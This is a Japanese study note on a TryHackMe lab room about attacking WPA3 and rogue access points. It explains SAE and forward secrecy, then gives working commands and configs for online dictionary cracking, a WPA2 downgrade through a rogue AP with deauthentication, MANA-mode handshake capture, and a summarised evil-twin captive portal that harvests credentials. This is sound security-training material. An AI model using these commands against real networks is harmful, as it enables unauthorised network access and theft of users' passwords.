# WPA3

https://tryhackme.com/room/attackingwpa3androgueaccesspoints

WPA2 と比較した WPA3 の強さは、パスフレーズのクラックに成功したとしても、パケットキャプチャを復号化することはできず、せいぜいネットワークに接続することしかできない点。

## SAE（Simultaneous Authentication of Equals）

SAEは、4-wayハンドシェイクに変わるハンドシェイク。

### バランス型のパスワード認証鍵交換（PAKE）

バランス型とは、両者が同じ秘密鍵を保持し、パスワードを知っているクライアントと、そこから派生した検証値を保存するサーバーとの間に非対称性がないため、どちらの側でも交換を開始できるということ。

パスワード認証型とは、証明書やバックエンドサーバーではなく、共有されたパスフレーズによって各当事者の正当性を証明すること。

鍵交換型とは、この手順全体の目的が、第三者が推測できない新しいセッション鍵について合意すること。

### 前方秘匿性

**いかなる手段で取得したパスフレーズでも、取得前にキャプチャされたトラフィックをロック解除することはできない。** なぜなら、それらのセッションキーを生成した一時的な値はもはや存在しないから。

### OWE（Opportunistic Wireless Encryption）

WPA2のオープンネットワークでは鍵が全く確立されず、通信範囲内の誰でもトラフィックを読み取ることができたが、WPA3は Wi-Fi Enhanced Open でパスフレーズ無しでネットワーク暗号化される。

### 管理フレーム保護

管理フレーム保護がオプションではなく必須となり、偽造認証解除フレームが廃止された。  
ただし、トランジションモードの場合はWPA3接続中であっても認証解除フレームが受け入れられている。（そうでないと後述のダウングレード攻撃が成立しない）

## オンライン辞書攻撃

https://github.com/blunderbuss-wctf/wacker

```sh
sudo python3 /root/tools/wacker/wacker.py --wordlist /home/user/wordlists/wifi-passwords.txt \
  --interface wlan1 --bssid F0:9F:C2:11:0A:24 --ssid Mgmt-WiFi --freq 2462

sudo tail -f /tmp/wacker/wlan1_wacker.log
```

クラックしたパスフレーズを使ってネットワークに接続する。

```sh
cat << 'EOF' > /tmp/mgmt-wifi.conf
p2p_disabled=1
network={
    ssid="Mgmt-WiFi"
    key_mgmt=SAE
    psk="chocolate1"
    ieee80211w=2
}
EOF

sudo wpa_supplicant -i wlan1 -c /tmp/mgmt-wifi.conf -B
sudo dhclient wlan1
```

## ダウングレード攻撃

トランジションモード、またはミックスモードでは、最新のクライアントはSAEを読み取り、完全なWPA3接続をネゴシエートし、従来のクライアントはPSKを読み取り、古い方式で接続する。どちらのクライアントも同じパスフレーズで設定される。

### モードの識別

IT-Admin がSAEとPSKの2つのモードを受け入れていることが分かる。

```sh
user@debian-thm:~$ sudo iw dev wlan1 scan | grep -A10 'SSID: Mgmt-WiFi' | grep -E 'SSID|Authentication'
	SSID: Mgmt-WiFi
		 * Authentication suites: SAE
user@debian-thm:~$ sudo iw dev wlan1 scan | grep -A10 'SSID: IT-Admin' | grep -E 'SSID|Authentication'
	SSID: IT-Admin
		 * Authentication suites: PSK SAE
```

### 不正アクセスポイント

https://github.com/sensepost/hostapd-mana

本物のSSIDと同じ値を持つ、WPA2-PSKの不正アクセスポイントを起動

```sh
cat << 'EOF' > /tmp/rogue_it.conf
interface=wlan2
ssid=IT-Admin
hw_mode=g
channel=11
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=password123
EOF
```

```sh
user@ip-10-146-129-157:~$ sudo /root/tools/hostapd-mana/hostapd/hostapd /tmp/rogue_it.conf
Configuration file: /tmp/rogue_it.conf
Using interface wlan2 with hwaddr 02:00:00:00:02:00 and ssid "IT-Admin"
wlan2: interface state UNINITIALIZED->ENABLED
wlan2: AP-ENABLED
```

### 認証解除攻撃

キャプチャ開始

```sh
sudo airodump-ng -c 11 --bssid 02:00:00:00:02:00 -w downgrade wlan0mon
```

認証解除要求

```sh
sudo aireplay-ng -0 4 -a F0:9F:C2:1A:CA:25 -c 10:F9:6F:AC:53:52 wlan0mon
```

パスワードクラック

```sh
sudo aircrack-ng -w /home/user/wordlists/wifi-passwords.txt -b 02:00:00:00:02:00 downgrade-01.cap
```

### ネットワークに接続

```sh
cat << 'EOF' > /tmp/it-admin.conf
network={
    ssid="IT-Admin"
    key_mgmt=WPA-PSK
    psk="bubblegum"
    ieee80211w=1
}
EOF

sudo wpa_supplicant -B -i wlan1 -c /tmp/it-admin.conf
sudo dhclient wlan1
ip addr show wlan1
```

## 不正APによるハンドシェイクの取得

### hostapd-manaをMANAモードで実行

manaモードとは、アクセスポイントが自身の名前にのみ応答するのではなく、任意のSSIDへの指向プローブ要求に応答すること。

```sh
cat << 'EOF' > /tmp/mana.conf
interface=wlan2
ssid=Free-WiFi
hw_mode=g
channel=11
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=password123
enable_mana=1
mana_loud=1
EOF
```

```sh
sudo /root/tools/hostapd-mana/hostapd/hostapd /tmp/mana.conf
```

### 検出したSSIDを使って不正APを起動

```sh
cat << 'EOF' > /tmp/rogue_office.conf
interface=wlan2
ssid=Office-WiFi
hw_mode=g
channel=11
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=password123
EOF
```

```sh
sudo /root/tools/hostapd-mana/hostapd/hostapd /tmp/rogue_office.conf
```

### キャプチャ、パスワードクラック

```sh
sudo airodump-ng -c 11 --bssid 02:00:00:00:02:00 -w office wlan0mon
```

```sh
sudo aircrack-ng -w /home/user/wordlists/wifi-passwords.txt -e Office-WiFi office-01.cap
```

## クライアントフィッシング

難解なので[リンク先](https://tryhackme.com/room/attackingwpa3androgueaccesspoints?taskNo=7&sharerId=674ed42e2374d1bc93db444c)参照。  要約すると下記のようなことをやっている。

### 偽のWi-Fi親機 (hostapd)

本物のWi-Fiと同じ名前（Guest-WiFi）で電波を飛ばし、接続を受け入れる。

### IPアドレス・DNS割り当て (dnsmasq)

接続してきたスマホやPCにIPアドレスを配る。

同時に、被害者が「YahooやGoogleなど、どこを見ようとしても、すべて攻撃者のIP（192.168.10.1）に誘導する（偽DNS）」設定。

### 通信の強制転送 (iptables)

被害者がWebサイトを開こうとした通信（80番ポートなど）を、強制的に攻撃者のWebサーバー（8080番ポート）へ送る。

### 偽のログイン画面 (portal.py)

「Wi-Fiを利用するにはログインしてください」という画面を表示し、ユーザーが入力したユーザー名とパスワードをログファイルに保存（横取り）。
